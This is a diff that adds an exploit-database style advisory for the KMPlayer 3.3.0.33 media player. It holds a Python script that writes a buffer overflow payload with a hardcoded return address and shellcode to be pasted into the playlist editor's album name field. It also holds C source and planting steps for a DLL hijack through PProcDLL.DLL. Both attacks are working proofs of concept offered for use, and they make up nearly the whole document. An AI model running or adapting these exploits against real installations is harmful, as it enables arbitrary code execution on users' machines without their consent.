@@ -1,0 +1,55 @@
+# Exploit Title: The KMPlayer v3.3.0.33 Multiple Vulnerabilities
+# Date: October, 26, 2012
+# Discovered By: Mr.XHat
+# Exploit Author: Mr.XHat
+# E-Mail: Mr.XHat {AT} Gmail.com
+# Vendor: http://www.kmplayer.com/
+# Version: 3.3.0.33
+# Tested On: WinXP SP3 EN
+#########################
+
+# Buffer Overflow Vulnerability:
+
+junk = "\x41" * 250
+eip = "\xD7\x30\x9D\x7C"
+shellcode = (
+"\x31\xC9\x51\x68\x63\x61\x6C\x63"
+"\x54\xB8\xC7\x93\xC2\x77\xFF\xD0"
+)
+exploit = junk + eip + shellcode
+file = open("Exploit.txt", "w")
+file.write(exploit)
+file.close()
+
+# How To Do Exploit:
+# First Run The KMPlayer And Get To Playlist > Playlist Editor... > Add New album Then Past Exploit Code To "Album Name:", Now Your Shellcode Will Executed!
+############################################################################################################################################################
+
+# DLL Hijacking Vulnerability:
+
+# DLL Name: PProcDLL.DLL
+
+# How To Do Hijack:
+First Compile Below Source Code With C Compiler(s) And Rename Compiled DLL To PProcDLL.DLL Then Copy It To The KMPlayer Installed Path, Now If You Run The KMPlayer DLL Will Hijacked!
+
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    switch (fdwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+        dll_hijack();
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+int dll_hijack()
+{
+    MessageBox(0, "DLL Hijacked!", "Mr.XHat", MB_OK);
+}
+#
+
+# Enjoys!
